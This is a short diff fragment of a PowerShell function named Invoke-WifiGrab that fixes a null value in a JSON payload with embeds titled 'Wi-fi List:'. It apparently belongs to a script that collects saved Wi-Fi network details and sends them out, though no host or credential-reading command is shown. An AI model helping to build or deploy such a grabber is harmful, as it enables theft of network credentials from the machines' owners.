@@ -45,7 +45,7 @@ function Invoke-WifiGrab {
 
     # Prepare JSON payload
     $jsonData = @{
-        content = null
+        content = $null
         embeds = @(
             @{
                 title = "Wi-fi List:"
